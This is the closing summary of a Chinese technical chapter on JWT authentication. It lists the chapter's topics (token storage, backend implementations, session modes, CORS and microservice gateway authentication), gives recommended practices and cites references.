1. **前端存储方案**：LocalStorage、Cookie、Memory 三种方案的安全性对比与混合模式推荐
2. **后端实现**：Node.js、Java、Python 三种主流语言的完整代码示例
3. **会话模式选择**：无状态 vs 有状态的决策树与混合模式
4. **跨域认证**：CORS 配置详解与常见问题排查
5. **微服务应用**：API 网关统一认证架构与服务间 Token 传递

**关键 takeaway：**
- 生产环境优先使用 HttpOnly Cookie + Memory 混合存储
- 微服务架构采用网关统一认证，后端服务信任网关传递的用户信息
- 服务间调用使用短期 Service Token，避免直接传递用户 Token

---

**引用来源：**

1. MDN Web Docs - CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
2. Spring Cloud Gateway Reference: https://docs.spring.io/spring-cloud-gateway/reference/
3. OWASP JWT Storage Recommendations: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
4. CSDN: Next.js 认证终极指南 - JWT 存储方案 Cookie vs LocalStorage 安全对比
5. CSDN: Spring Cloud 微服务网关统一鉴权实战
6. CSDN: Gateway - CORS 跨域配置最佳实践
7. 阿里云文档 - JWT 认证鉴权配置

---

*本章字数：约 6800 字*
